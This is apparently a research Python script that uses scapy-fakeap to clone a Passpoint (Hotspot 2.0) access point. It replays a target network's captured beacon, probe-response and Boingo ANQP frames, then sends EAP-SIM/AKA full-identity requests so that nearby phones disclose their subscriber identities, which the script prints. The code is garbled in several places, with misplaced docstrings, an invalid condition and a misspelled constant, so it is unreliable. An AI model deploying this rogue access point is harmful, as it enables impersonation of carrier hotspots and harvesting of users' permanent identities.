#!/usr/bin/env python
# This code is an example of using scapy-fakeap code with custom Callbacks to
# masquerade as an access point that handles eap-sim/aka

# It requires the scapy-fakeap code found on github
# at https://github.com/rpp0/scapy-fakeap

from types import MethodType
from scapy.layers.dot11 import *
from fakeap import *
import argparse
from random import randint

__author__ = 'Lucas Foppe'

#GOBALS
EAP_RESPONE=2
EAP_IDENTITY=1
EAP_AKA=23
EAP_SIM=18

def argParser():
    parser = argparse.ArgumentParser(description="Example of cloning an
                                                  EAP-SIM/AKA Access Point")
    parser.add_argument("-m","--mode",type = int, choices=[0,1,2], default=0,
                        help=("Set random (0), always aka(1) or always sim(2)
                               for the EAP method specific start message.
                               Default is random(0)")
                       )
    return parser.parse_args()

### WHERE TO EDIT FOR STEP 2 ###
# The below function provides our cloned beacon rather than the standard beacon
# used by the default cod
def my_beacon(self,ssid):  # Our custom callback
    # Step 2e: replace WALRUS_BEACON with target AP's Beacon
    WALRUS_BEACON = ('h2\xac6=\x00\x00\x00d\x001\x04\x00\x10Passpoint Secure
                      \x01\x08\x82\x84\x0b\x16\x0c\x12\x18$\x03\x01\x01\x05
                      \x04\x00\x01\x00\x00*\x01\x002\x040H`l0\x14\x01\x00\x00
                      \x0f\xac \x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f
                      \xac\x01\x00\x00\x7f\x08\x00\x10\x00\x80\x00\x00 \x00
                      \x00E \x01\x00k\t\x12\x02\x02\x00\x1a\x1e\x18\xc0\xe1l
                      \x02\x04\x00\xdd\x05Po\x9a\x10\x00\xdd\x16Po\x9a\t\x02
                      \x02\x00\x00\x00\x03\x06\x00\x00\x1a\x1e\x18\xc0\xe1
                      \n\x01\x00\x00\xdd\x07\x00\x0b\x86\x01\x04\x08\x14')

    # need to add the radiotap header back on
    beacon = (self.ap.get_radiotap_header()
             /Dot11(subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=self.ap.mac,
                    addr3=self.ap.mac)
             /Dot11Beacon(WALRUS_BEACON))

    # increments the sequence number
    beacon.SC = self.ap.next_sc()
    # sets current timestamp
    beacon[Dot11Beacon].timestamp = self.ap.current_timestamp()

    # sends the packet
    #sendp(beacon,iface = self.ap.interface,verbose = False)
    self.ap.s1.send(beacon)


# The follow function replaces the standard probe response function of
# scapy-fakeap
def my_probe(self, source, ssid):


    # Step 3e: replace WALRUS_PROBE with target AP's probe
    WALRUS_PROBE=('JW\xf76=\x00\x00\x00d\x001\x04\x00\x10Passpoint Secure\x01
            \x08\x82\x84\x0b\x0c\x12\x16\x18$\x03\x01\x01*\x01\x002\x040H`l0
            \x14\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00
            \x0f\xac\x01\x00\x00\x7f\x08\x00\x10\x00\x80\x00\x00\x00\x00E\x01
            \x00b\x03ESTk\t\x12\x02\x02\x00\x1a\x1e\x18\xc0\xe1l\x02\x04\x00
            \xdd\x05Po\x9a\x10\x00\xdd\x16Po\x9a\t\x02\x02\x00\x00\x00\x03\x06
            \x00\x00\x1a\x1e\x18\xc0\xe1\n\x01\x00\x00')

    probe_response_packet = (self.ap.get_radiotap_header() /Dot11(subtype=5,
                             addr1=source, addr2=self.ap.mac,
                             addr3=self.ap.mac, SC = self.ap.next_sc())
                             /Dot11ProbeResp(WALRUS_PROBE))
    probe_response_packet[Dot11ProbeResp].timestamp = self.ap.current_timestamp()

    #sendp(probe_response_packet, iface = self.ap.interface, verbose = False)
    self.ap.s2.send(probe_response_packet)

def my_recv_pkt(self,pkt):
    if (pkt and pkt[0].getlayer(Dot11).subtype==13L
            and pkt[0].load[0:2]=="\x04\x0a"):

"""
Every time we receive a packet, this function will be called. In this
example, our function checks if the packet is a ANQP frame. If it is,
it sends an ANQP Response. This function is not needed for EAP-SIM
alone. We used it to test ANQP and it provides an example of how you
could write a response to any packet you want.
"""

# the ANQP values here were generated in the same way as the Probe
# Response and Beacon except grabbing just the final RAW layer of the
# ANQP response
        anqp = ('\x04\x0b\x00\x00\x00\x00\x00l\x02\x04\x00\xa7\x00\x01\x01\x10
               \x00\x01\x01\x02\x01\x04\x01\x05\x01\x06\x01\x07\x01\x08\x01\x0c
               \x01\x07\x01\x17\x00\x01\x00\x13\x00\x01\nboingo.com\x01\x05\x15
               \x01\x02\x01\x01\x08\x01\x0b\x00\x00\t\x00\x07\x02\x13\x10\x02
               \x13\x00\x14\x0c\x01\x1e\x00\x00\nboingo.com\x11
               boingohotspot.net\x02\x01\x14\x00\x00\x00\x03eng\rengboingo.com
               \xdd\xdd\n\x00Po\x9a\x11\x02\x00\x02\x03\x04\x05\xdd\xdd\x1d\x00
               Po\x9a\x11\x03\x00\x03eng\x12engBoingo Wireless')

        anqp_resp = (self.ap.get_radiotap_header()
                   /Dot11(subtype=13, addr1=pkt.addr2, addr2=self.ap.mac,
                          addr3=self.ap.mac, SC = self.ap.next_sc())
                   /str(anqp))
        print "sending anqp to {}".format(pkt.addr2)
        for i in range(5):
            #sendp(anqp_resp, iface = self.ap.interface, verbose = False)
            self.ap.s2.send(anqp_resp)


    elif (EAP in pkt and if pkt[EAP].code == EAP_RESPONSE):
        #EAP-IDENTITY
        #TODO Fix this start mode crap
        start_mode=1
        if (pkt[EAP].type==EAP_IDENTITY and pkt.addr1==self.ap.mac):
            print "{} sent Identity = {}".format(pkt.addr2,pkt[Raw].load)
            identity = pkt[Raw].load
            # At this point point we have gotten the generic response but now
            # we want to send the specific start message.
            # This is where the mode command line option comes in. If it is
            # not set the program will run in random mode
            # and randomly select an EAP-SIM or EAP-AKA start message.
            # CMDLINE options will pick one specifically.
            if start_mode==0:
                 start_mode = randint(1,2)
            elif start_mode==1:
                #AKA
                           #subtype identity     AT_FULLID_REQ
                eap_data = "\x05\x00\x00"    +  "\x0a\x01\x00\x00"
                self.dot1x_eap_resp(pkt.addr2, 1, EAP_AKA, eap_data)

            elif start_mode==2:
                           # subtype start
                eap_data =("\x0a\x00\x00"
                           # AT_VERSION_LIST
                           + "\x0f\x02\x00\x02\x00\x01\x00\x00"
                           # AT_FULLID_REQ
                           + "\x0a\x01\x00\x00")
                self.dot1x_eap_resp(pkt.addr2, 1, 18, eap_data)

# If packet wasn't ANQP we need to do our normal access point functions so
# call tandard recv_pkt function
    else:
        self.recv_pkt(pkt)


if __name__=="__main__":

    args = argParser()
    global start_mode
    start_mode = args.mode
    print start_mode
    # put the name of your wireless interface here
    # REMEMBER THAT THE INTERFACE NEEDS TO BE IN MONITOR MODE ALREADY
    WALRUS_INTERFACE="mon0"

    # put name of the mocked SSID here
    WALRUS_SSID='Passpoint Secure'

    ap = FakeAccessPoint(WALRUS_INTERFACE, WALRUS_SSID)
    ap.wpa = AP_WLAN_TYPE_WPA2  # Enable WPA2
    ap.ieee8021x = 1  # Enable 802.1X (WPA-Enterprise)

    # This is how we set up our AP to use our custom functions created above.
    my_callbacks = Callbacks(ap)
    my_callbacks.cb_dot11_beacon = MethodType(my_beacon, my_callbacks)
    my_callbacks.cb_dot11_probe_req = MethodType(my_probe, my_callbacks)
    my_callbacks.cb_recv_pkt = MethodType(my_recv_pkt,my_callbacks)
    ap.callbacks = my_callbacks

    ap.run()
